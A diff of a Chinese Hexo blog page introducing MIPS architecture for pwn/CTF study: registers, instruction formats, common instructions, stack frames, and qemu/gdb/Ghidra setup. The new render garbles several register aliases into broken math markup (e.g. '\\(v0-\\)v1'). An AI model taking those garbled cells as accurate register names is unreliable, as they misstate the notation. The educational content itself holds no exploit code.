@@ -111,7 +111,11 @@
     
     
     
-<meta name="generator" content="Hexo 7.3.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 
 
@@ -668,110 +672,123 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h4 id="一、mips架构概述"><a href="#一、mips架构概述" class="headerlink" title="一、mips架构概述"></a>一、mips架构概述</h4><h5 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h5><div class="table-container">
+			<h4 id="一mips架构概述">一、mips架构概述</h4>
+<h5 id="寄存器">1.寄存器</h5>
 <table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 10%" />
+<col style="width: 80%" />
+</colgroup>
 <thead>
 <tr>
-<th style="text-align:left">寄存器</th>
+<th style="text-align: left;">寄存器</th>
 <th>别名</th>
 <th>用途</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td style="text-align:left">$0</td>
+<td style="text-align: left;">$0</td>
 <td>$zero</td>
 <td>常量0</td>
 </tr>
 <tr>
-<td style="text-align:left">$1</td>
+<td style="text-align: left;">$1</td>
 <td>$at</td>
-<td>保留给汇编器（Assembler Temporary）。在汇编过程中用于一些临时计算，程序员不应直接使用。</td>
+<td>保留给汇编器（Assembler
+Temporary）。在汇编过程中用于一些临时计算，程序员不应直接使用。</td>
 </tr>
 <tr>
-<td style="text-align:left">$2-$3</td>
-<td>$v0-$v1</td>
+<td style="text-align: left;">$2-$3</td>
+<td><span class="math inline">\(v0-\)</span>v1</td>
 <td>用于存储函数的返回值。</td>
 </tr>
 <tr>
-<td style="text-align:left">$4-$7</td>
-<td>$a0-$a3</td>
+<td style="text-align: left;">$4-$7</td>
+<td><span class="math inline">\(a0-\)</span>a3</td>
 <td>函数调用参数，用于传递最多 4 个函数参数。</td>
 </tr>
 <tr>
-<td style="text-align:left">$8-$15</td>
-<td>$t0-$t7</td>
+<td style="text-align: left;">$8-$15</td>
+<td><span class="math inline">\(t0-\)</span>t7</td>
 <td>临时寄存器。用于函数内部的临时计算，不需要保存其值。</td>
 </tr>
 <tr>
-<td style="text-align:left">$16-$23</td>
-<td>$s0-$s7</td>
+<td style="text-align: left;">$16-$23</td>
+<td><span class="math inline">\(s0-\)</span>s7</td>
 <td>保存寄存器。用于保存函数调用期间的值，调用函数时需要保留的值。</td>
 </tr>
 <tr>
-<td style="text-align:left">$24-$25</td>
-<td>$t8-$t9</td>
-<td>临时寄存器。与 <code>$t0-$t7</code> 类似，但通常不需要在函数调用中保存其值。</td>
+<td style="text-align: left;">$24-$25</td>
+<td><span class="math inline">\(t8-\)</span>t9</td>
+<td>临时寄存器。与 <code>$t0-$t7</code>
+类似，但通常不需要在函数调用中保存其值。</td>
 </tr>
 <tr>
-<td style="text-align:left">$26-$27</td>
-<td>$k0-$k1</td>
+<td style="text-align: left;">$26-$27</td>
+<td><span class="math inline">\(k0-\)</span>k1</td>
 <td>保留给操作系统内核。通常用于内核中进行系统调用或中断处理。</td>
 </tr>
 <tr>
-<td style="text-align:left">$28</td>
+<td style="text-align: left;">$28</td>
 <td>$gp</td>
 <td>全局指针。指向全局数据区域的基地址，便于访问全局变量。</td>
 </tr>
 <tr>
-<td style="text-align:left">$29</td>
+<td style="text-align: left;">$29</td>
 <td>$sp</td>
 <td>堆栈指针。指向当前堆栈的顶部，用于管理函数调用和局部变量。</td>
 </tr>
 <tr>
-<td style="text-align:left">$30</td>
-<td>$fp($s8)</td>
+<td style="text-align: left;">$30</td>
+<td><span class="math inline">\(fp(\)</span>s8)</td>
 <td>帧指针。指向当前栈帧的基地址，通常用于访问局部变量和参数。</td>
 </tr>
 <tr>
-<td style="text-align:left">$31</td>
+<td style="text-align: left;">$31</td>
 <td>$ra</td>
 <td>返回地址。用于存储函数调用的返回地址，在函数调用时保存，并在函数返回时使用。</td>
 </tr>
 <tr>
-<td style="text-align:left">PC</td>
+<td style="text-align: left;">PC</td>
 <td>PC</td>
 <td>保存当前正在执行的指令的地址，并在每次指令执行后自动递增，以指向下一条指令的地址。</td>
 </tr>
 </tbody>
 </table>
-</div>
 <p>mips架构中的fp寄存器相当于rbp，pc寄存器相当于rip。</p>
-<h5 id="2-特征"><a href="#2-特征" class="headerlink" title="2.特征"></a>2.特征</h5><ul>
-<li><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p>
-</li>
-<li><p><strong>MIPS 处理器通常将指令缓存（I-cache）和数据缓存（D-cache）分开，这有助于提高访问效率和减少缓存冲突。</strong></p>
-</li>
-<li><p>所有 MIPS 指令都具有固定的 32 位长度，这使得指令解码更加简单和高效。</p>
-</li>
-<li><p>MIPS 默认使用大端字节序，即最显著字节存储在最低地址。虽然 MIPS 也支持小端字节序，但大端字节序是 MIPS 的传统配置。</p>
-</li>
+<h5 id="特征">2.特征</h5>
+<ul>
+<li><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p></li>
+<li><p><strong>MIPS
+处理器通常将指令缓存（I-cache）和数据缓存（D-cache）分开，这有助于提高访问效率和减少缓存冲突。</strong></p></li>
+<li><p>所有 MIPS 指令都具有固定的 32
+位长度，这使得指令解码更加简单和高效。</p></li>
+<li><p>MIPS 默认使用大端字节序，即最显著字节存储在最低地址。虽然 MIPS
+也支持小端字节序，但大端字节序是 MIPS 的传统配置。</p></li>
 <li><p>三种主要指令格式：</p>
 <ul>
-<li><strong>R 型</strong>：用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</li>
-<li><strong>I 型</strong>：用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</li>
-<li><strong>J 型</strong>：用于跳转，例如 <code>j</code>、<code>jal</code>。</li>
-</ul>
-</li>
+<li><strong>R 型</strong>：用于寄存器间操作（算术、逻辑等），例如
+<code>add</code>、<code>sub</code>。</li>
+<li><strong>I 型</strong>：用于立即数操作、加载和存储、分支等，例如
+<code>addi</code>、<code>lw</code>。</li>
+<li><strong>J 型</strong>：用于跳转，例如
+<code>j</code>、<code>jal</code>。</li>
+</ul></li>
 <li><p>流水线操作</p>
 <p>MIPS架构采用了流水线技术来提高指令执行的效率。流水线允许处理器同时处理多条指令的不同部分，从而大幅提高吞吐量。</p>
 <p>常见的MIPS芯片流水线操作分为五个阶段：</p>
 <ul>
-<li><strong>IF（Instruction Fetch，指令提取）</strong>：从内存中提取指令。</li>
-<li><strong>ID（Instruction Decode，指令解码）</strong>：对提取的指令进行解码，确定需要执行的操作。</li>
+<li><strong>IF（Instruction
+Fetch，指令提取）</strong>：从内存中提取指令。</li>
+<li><strong>ID（Instruction
+Decode，指令解码）</strong>：对提取的指令进行解码，确定需要执行的操作。</li>
 <li><strong>EX（Execute，执行）</strong>：执行指令，包括算术运算、逻辑运算等。</li>
-<li><strong>MEM（Memory Access，存储器访问）</strong>：访问内存，读取或写入数据。</li>
-<li><strong>WB（Write Back，寄存器写回）</strong>：将执行结果写回寄存器。</li>
+<li><strong>MEM（Memory
+Access，存储器访问）</strong>：访问内存，读取或写入数据。</li>
+<li><strong>WB（Write
+Back，寄存器写回）</strong>：将执行结果写回寄存器。</li>
 </ul>
 <p>在理想情况下，流水线中的每个阶段都会同时进行，使得处理器可以每个时钟周期执行一条新指令。然而，由于某些指令的执行需要更多的时间，可能会导致流水线暂停（称为“流水线停顿”），从而影响性能。</p>
 <p><strong>分支延迟槽</strong></p>
@@ -779,15 +796,16 @@
 <p>这意味着，在编写MIPS汇编代码或分析MIPS的二进制文件时，需要特别注意分支延迟槽的存在。例如，在以下MIPS汇编代码中：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0007F944    move    $t9, $s0</span><br><span class="line">.text:0007F948    jalr    $t9              </span><br><span class="line">.text:0007F94C    move    $a0, $s1</span><br></pre></td></tr></table></figure></div>
 <p>虽然<code>jalr</code>指令是一个跳转指令，但紧接在其后的<code>move $a0, $s1</code>指令会在跳转之前执行。</p>
-<p>一般而言跳转指令的下一条指令会是nop，但这种行为在查找利用漏洞的gadgets以及构造payload时非常重要。</p>
-</li>
+<p>一般而言跳转指令的下一条指令会是nop，但这种行为在查找利用漏洞的gadgets以及构造payload时非常重要。</p></li>
 </ul>
-<h5 id="3-指令格式"><a href="#3-指令格式" class="headerlink" title="3.指令格式"></a>3.指令格式</h5><blockquote>
-<p>op:指令基本操作，称为操作码。<br>rs:第一个源操作数寄存器。<br>rt:第二个源操作数寄存器。<br>rd:存放操作结果的目的操作数。<br>shamt:位移量；<br>funct:函数，这个字段选择op操作的某个特定变体。  </p>
+<h5 id="指令格式">3.指令格式</h5>
+<blockquote>
+<p>op:指令基本操作，称为操作码。 rs:第一个源操作数寄存器。
+rt:第二个源操作数寄存器。 rd:存放操作结果的目的操作数。 shamt:位移量；
+funct:函数，这个字段选择op操作的某个特定变体。</p>
 </blockquote>
 <p>32位长度分配如下</p>
-<p><strong>R格式</strong>   </p>
-<div class="table-container">
+<p><strong>R格式</strong></p>
 <table>
 <thead>
 <tr>
@@ -810,10 +828,9 @@
 </tr>
 </tbody>
 </table>
-</div>
-<p> 用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</p>
-<p><strong>I格式</strong>      </p>
-<div class="table-container">
+<p>用于寄存器间操作（算术、逻辑等），例如
+<code>add</code>、<code>sub</code>。</p>
+<p><strong>I格式</strong></p>
 <table>
 <thead>
 <tr>
@@ -832,10 +849,9 @@
 </tr>
 </tbody>
 </table>
-</div>
-<p>用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</p>
-<p><strong>J格式</strong>   </p>
-<div class="table-container">
+<p>用于立即数操作、加载和存储、分支等，例如
+<code>addi</code>、<code>lw</code>。</p>
+<p><strong>J格式</strong></p>
 <table>
 <thead>
 <tr>
@@ -850,10 +866,16 @@
 </tr>
 </tbody>
 </table>
-</div>
 <p>用于跳转，例如 <code>j</code>、<code>jal</code>。</p>
-<h5 id="4-常用指令"><a href="#4-常用指令" class="headerlink" title="4.常用指令"></a>4.常用指令</h5><div class="table-container">
+<h5 id="常用指令">4.常用指令</h5>
 <table>
+<colgroup>
+<col style="width: 7%" />
+<col style="width: 15%" />
+<col style="width: 16%" />
+<col style="width: 15%" />
+<col style="width: 45%" />
+</colgroup>
 <thead>
 <tr>
 <th><strong>指令</strong></th>
@@ -869,91 +891,104 @@
 <td>加法（有符号）</td>
 <td><code>add $rd, $rs, $rt</code></td>
 <td><code>add $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在
+<code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>addu</code></strong></td>
 <td>加法（无符号）</td>
 <td><code>addu $rd, $rs, $rt</code></td>
 <td><code>addu $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加（无符号），结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 和 <code>$t2</code>
+的值相加（无符号），结果存储在 <code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>sub</code></strong></td>
 <td>减法（有符号）</td>
 <td><code>sub $rd, $rs, $rt</code></td>
 <td><code>sub $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值，结果存储在
+<code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>subu</code></strong></td>
 <td>减法（无符号）</td>
 <td><code>subu $rd, $rs, $rt</code></td>
 <td><code>subu $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值（无符号），结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 的值减去 <code>$t2</code>
+的值（无符号），结果存储在 <code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>and</code></strong></td>
 <td>按位与</td>
 <td><code>and $rd, $rs, $rt</code></td>
 <td><code>and $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与，结果存储在
+<code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>or</code></strong></td>
 <td>按位或</td>
 <td><code>or $rd, $rs, $rt</code></td>
 <td><code>or $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位或，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位或，结果存储在
+<code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>xor</code></strong></td>
 <td>按位异或</td>
 <td><code>xor $rd, $rs, $rt</code></td>
 <td><code>xor $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位异或，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位异或，结果存储在
+<code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>nor</code></strong></td>
 <td>按位与非</td>
 <td><code>nor $rd, $rs, $rt</code></td>
 <td><code>nor $t0, $t1, $t2</code></td>
-<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与非，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与非，结果存储在
+<code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>sll</code></strong></td>
 <td>左移</td>
 <td><code>sll $rd, $rt, shamt</code></td>
 <td><code>sll $t0, $t1, 2</code></td>
-<td>将 <code>$t1</code> 的值左移 2 位，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 的值左移 2 位，结果存储在 <code>$t0</code>
+中。</td>
 </tr>
 <tr>
 <td><strong><code>srl</code></strong></td>
 <td>逻辑右移</td>
 <td><code>srl $rd, $rt, shamt</code></td>
 <td><code>srl $t0, $t1, 2</code></td>
-<td>将 <code>$t1</code> 的值右移 2 位，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 的值右移 2 位，结果存储在 <code>$t0</code>
+中。</td>
 </tr>
 <tr>
 <td><strong><code>sra</code></strong></td>
 <td>算术右移</td>
 <td><code>sra $rd, $rt, shamt</code></td>
 <td><code>sra $t0, $t1, 2</code></td>
-<td>将 <code>$t1</code> 的值算术右移 2 位，结果存储在 <code>$t0</code> 中</td>
+<td>将 <code>$t1</code> 的值算术右移 2 位，结果存储在 <code>$t0</code>
+中</td>
 </tr>
 <tr>
 <td><strong><code>lw</code></strong></td>
 <td>加载字（32 位）</td>
 <td><code>lw $rt, offset($rs)</code></td>
 <td><code>lw $t0, 4($a0)</code></td>
-<td>从地址 <code>$a0 + 4</code> 处加载 4 字节数据到 <code>$t0</code>。</td>
+<td>从地址 <code>$a0 + 4</code> 处加载 4 字节数据到
+<code>$t0</code>。</td>
 </tr>
 <tr>
 <td><strong><code>sw</code></strong></td>
 <td>存储字（32 位）</td>
 <td><code>sw $rt, offset($rs)</code></td>
 <td><code>sw $t0, 4($a0)</code></td>
-<td>将 <code>$t0</code> 中的数据存储到地址 <code>$a0 + 4</code> 处。</td>
+<td>将 <code>$t0</code> 中的数据存储到地址 <code>$a0 + 4</code>
+处。</td>
 </tr>
 <tr>
 <td><strong><code>lb</code></strong></td>
@@ -967,35 +1002,40 @@
 <td>存储字节（8 位）</td>
 <td><code>sb $rt, offset($rs)</code></td>
 <td><code>sb $t0, 0($a0)</code></td>
-<td>将 <code>$t0</code> 中的 1 字节数据存储到地址 <code>$a0</code> 处。</td>
+<td>将 <code>$t0</code> 中的 1 字节数据存储到地址 <code>$a0</code>
+处。</td>
 </tr>
 <tr>
 <td><strong><code>lui</code></strong></td>
 <td>加载上半字（立即数）</td>
 <td><code>lui $rt, imm</code></td>
 <td><code>lui $t0, 0x1234</code></td>
-<td>将立即数 <code>0x1234</code> 加载到 <code>$t0</code> 的高 16 位（低 16 位为 0）。</td>
+<td>将立即数 <code>0x1234</code> 加载到 <code>$t0</code> 的高 16 位（低
+16 位为 0）。</td>
 </tr>
 <tr>
 <td><strong><code>ori</code></strong></td>
 <td>立即数按位或</td>
 <td><code>ori $rt, $rs, imm</code></td>
 <td><code>ori $t0, $t1, 0xFF</code></td>
-<td>将 <code>$t1</code> 和立即数 <code>0xFF</code> 按位或，结果存储在 <code>$t0</code> 中。</td>
+<td>将 <code>$t1</code> 和立即数 <code>0xFF</code> 按位或，结果存储在
+<code>$t0</code> 中。</td>
 </tr>
 <tr>
 <td><strong><code>beq</code></strong></td>
 <td>等于分支</td>
 <td><code>beq $rs, $rt, offset</code></td>
 <td><code>beq $t0, $t1, label</code></td>
-<td>如果 <code>$t0</code> 等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
+<td>如果 <code>$t0</code> 等于 <code>$t1</code>，则跳转到
+<code>label</code>。</td>
 </tr>
 <tr>
 <td><strong><code>bne</code></strong></td>
 <td>不等于分支</td>
 <td><code>bne $rs, $rt, offset</code></td>
 <td><code>bne $t0, $t1, label</code></td>
-<td>如果 <code>$t0</code> 不等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
+<td>如果 <code>$t0</code> 不等于 <code>$t1</code>，则跳转到
+<code>label</code>。</td>
 </tr>
 <tr>
 <td><strong><code>j</code></strong></td>
@@ -1009,7 +1049,8 @@
 <td>跳转并链接</td>
 <td><code>jal target</code></td>
 <td><code>jal subroutine</code></td>
-<td>跳转到 <code>subroutine</code>，并将返回地址存储在 <code>$ra</code> 寄存器中。</td>
+<td>跳转到 <code>subroutine</code>，并将返回地址存储在 <code>$ra</code>
+寄存器中。</td>
 </tr>
 <tr>
 <td><strong><code>jr</code></strong></td>
@@ -1027,69 +1068,77 @@
 </tr>
 </tbody>
 </table>
-</div>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or         s8,sp,zero		#实现了x86架构中的mov功能，相当于mov s8,sp</span><br></pre></td></tr></table></figure></div>
-<h5 id="5-MIPS栈帧结构"><a href="#5-MIPS栈帧结构" class="headerlink" title="5.MIPS栈帧结构"></a>5.MIPS栈帧结构</h5><p>典型的MIPS栈帧结构包括以下部分：</p>
+<h5 id="mips栈帧结构">5.MIPS栈帧结构</h5>
+<p>典型的MIPS栈帧结构包括以下部分：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------+ &lt;-- 栈顶（高地址）</span><br><span class="line">|  返回地址（$ra）          | 保存调用者的返回地址</span><br><span class="line">+-------------------------+</span><br><span class="line">|  上一个栈帧的栈指针        | 保存调用者的栈底指针（$fp）</span><br><span class="line">+-------------------------+</span><br><span class="line">|  函数参数（如果需要）      | 超过寄存器数量的函数参数存放在栈中</span><br><span class="line">+-------------------------+</span><br><span class="line">|  局部变量                | 局部变量、临时数据等</span><br><span class="line">+-------------------------+</span><br><span class="line">|  ...                    | 其他数据</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">|  栈空闲区                |</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+ &lt;-- 栈底（低地址）</span><br></pre></td></tr></table></figure></div>
-<p>MIPS架构中的栈通常是<strong>向下增长</strong>的，这意味着随着栈的推进，栈顶指针（<code>$sp</code>）的值会递减。其中局部变量的寻址是通过$sp或$fp进行的。</p>
+<p>MIPS架构中的栈通常是<strong>向下增长</strong>的，这意味着随着栈的推进，栈顶指针（<code>$sp</code>）的值会递减。其中局部变量的寻址是通过<span
+class="math inline">\(sp或\)</span>fp进行的。</p>
 <p>mips函数调用基本格式，其中分为叶子函数和非叶子函数，一般pwn题中做的都是非叶子函数，因为main函数之前程序还会执行其他初始化函数。</p>
 <p><strong>叶子函数</strong>和<strong>非叶子函数</strong>的主要区别在于它们是否调用其他函数：</p>
 <ul>
-<li><strong>叶子函数</strong>：<ul>
+<li><strong>叶子函数</strong>：
+<ul>
 <li><strong>定义</strong>：叶子函数是指在其内部不调用任何其他函数的函数。</li>
-<li>特点<ul>
+<li>特点
+<ul>
 <li>由于不调用其他函数，因此不需要保存和恢复返回地址（即<code>$ra</code>寄存器的值）。</li>
 <li>叶子函数通常不需要额外的栈操作，因为它不需要保存其他函数的返回地址或其他寄存器的值。</li>
 <li>返回时直接使用<code>jr $ra</code>指令跳转回调用者。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>非叶子函数</strong>：<ul>
+</ul></li>
+</ul></li>
+<li><strong>非叶子函数</strong>：
+<ul>
 <li><strong>定义</strong>：非叶子函数是指在其内部会调用其他函数的函数。</li>
-<li>特点<ul>
+<li>特点
+<ul>
 <li>由于可能调用其他函数，需要保存当前函数的返回地址（存储在<code>$ra</code>寄存器中）到栈中，以防止被覆盖。</li>
 <li>非叶子函数通常需要调整栈指针（<code>$sp</code>）并保存调用者的返回地址、寄存器状态等信息。</li>
 <li>在返回时，需要从栈中恢复保存的返回地址和寄存器状态，然后使用<code>jr $ra</code>指令返回到调用者。</li>
-</ul>
-</li>
-</ul>
-</li>
+</ul></li>
+</ul></li>
 </ul>
 <p>简而言之，叶子函数不会调用其他函数，因此对栈的操作较少；而非叶子函数会调用其他函数，因此需要处理更多的栈操作来保存和恢复状态。</p>
 <p>非叶子函数：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#Prologue</span><br><span class="line">addiu      sp,sp,-0x60				#栈上开辟空间</span><br><span class="line">sw         ra,local_4 (sp)			#存返回地址</span><br><span class="line">sw         s8,local_8 (sp)			#存该函数的栈底</span><br><span class="line">or         s8,sp,zero</span><br><span class="line">lui        gp,0x4a</span><br><span class="line">addiu      gp,gp,-0x5d50			#设置全局变量的指针</span><br><span class="line">sw         gp=&gt;_gp ,local_50 (sp)</span><br><span class="line">...</span><br><span class="line">#Epilogue</span><br><span class="line">lw         gp,local_50 (s8)</span><br><span class="line">or         v0,zero ,zero</span><br><span class="line">or         sp,s8,zero</span><br><span class="line">lw         ra,local_4 (sp)</span><br><span class="line">lw         s8,local_8 (sp)</span><br><span class="line">addiu      sp,sp,0x60</span><br><span class="line">jr         ra</span><br><span class="line">...</span><br><span class="line">#args offered</span><br><span class="line">li         a2,0x100						#size</span><br><span class="line">addiu      v0,s8,0x18</span><br><span class="line">or         a1,v0,zero					#buf</span><br><span class="line">or         a0,zero ,zero				#fd</span><br><span class="line">lw         v0,-0x7f90 (gp)		=&gt;-&gt;read                     </span><br><span class="line">or         t9,v0,zero</span><br><span class="line">bal        read                           </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>叶子函数：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行函数B的任务</span><br><span class="line"># 不调用其他函数</span><br><span class="line"># 直接返回</span><br><span class="line">jr $ra</span><br></pre></td></tr></table></figure></div>
-<h4 id="二、mips环境搭建"><a href="#二、mips环境搭建" class="headerlink" title="二、mips环境搭建"></a>二、mips环境搭建</h4><h5 id="1-安装qemu"><a href="#1-安装qemu" class="headerlink" title="1.安装qemu"></a>1.安装qemu</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu</span><br><span class="line"><span class="comment">#check if qemu existed</span></span><br><span class="line">qemu --version</span><br></pre></td></tr></table></figure></div>
-<h5 id="2-安装gdb-multiarch"><a href="#2-安装gdb-multiarch" class="headerlink" title="2.安装gdb-multiarch"></a>2.安装gdb-multiarch</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br><span class="line"><span class="comment">#check if gdb-multiarch downloaded successfully</span></span><br><span class="line">gdb-multiarch --version</span><br></pre></td></tr></table></figure></div>
-<h5 id="3-安装ghidra"><a href="#3-安装ghidra" class="headerlink" title="3.安装ghidra"></a>3.安装ghidra</h5><p>用于反编译mips指令，吾爱提供的有些IDA只包含x86和x64的Hex-Rays Decompiler插件</p>
-<p>ghidra下载地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/NationalSecurityAgency/ghidra/releases" >https://github.com/NationalSecurityAgency/ghidra/releases<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h4 id="二mips环境搭建">二、mips环境搭建</h4>
+<h5 id="安装qemu">1.安装qemu</h5>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu</span><br><span class="line"><span class="comment">#check if qemu existed</span></span><br><span class="line">qemu --version</span><br></pre></td></tr></table></figure></div>
+<h5 id="安装gdb-multiarch">2.安装gdb-multiarch</h5>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br><span class="line"><span class="comment">#check if gdb-multiarch downloaded successfully</span></span><br><span class="line">gdb-multiarch --version</span><br></pre></td></tr></table></figure></div>
+<h5 id="安装ghidra">3.安装ghidra</h5>
+<p>用于反编译mips指令，吾爱提供的有些IDA只包含x86和x64的Hex-Rays
+Decompiler插件</p>
+<p>ghidra下载地址：https://github.com/NationalSecurityAgency/ghidra/releases</p>
 <p>运行ghidra还需要JDK17及以上的环境</p>
-<p>jdk下载地址：<a class="link"   target="_blank" rel="noopener" href="https://adoptium.net/zh-CN/" >https://adoptium.net/zh-CN/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>jdk下载地址：https://adoptium.net/zh-CN/</p>
 <p><strong>启动 Ghidra</strong>：</p>
 <ul>
 <li><p>Windows</p>
 <ul>
-<li>进入 Ghidra 的安装目录，双击 <code>ghidraRun.bat</code> 文件启动 Ghidra。</li>
-</ul>
-</li>
+<li>进入 Ghidra 的安装目录，双击 <code>ghidraRun.bat</code> 文件启动
+Ghidra。</li>
+</ul></li>
 <li><p>Linux/macOS</p>
 <ul>
-<li><p>打开终端，导航到 Ghidra 的安装目录，然后运行以下命令启动 Ghidra：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure></div>
-</li>
-</ul>
-</li>
+<li><p>打开终端，导航到 Ghidra 的安装目录，然后运行以下命令启动
+Ghidra：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
 </ul>
 <p><strong>初次运行设置</strong>：</p>
 <ul>
-<li>Ghidra 启动后会提示你设置用户目录，你可以选择默认路径或自定义路径。</li>
+<li>Ghidra
+启动后会提示你设置用户目录，你可以选择默认路径或自定义路径。</li>
 <li>阅读并接受用户协议后，Ghidra 会启动并显示主界面。</li>
 </ul>
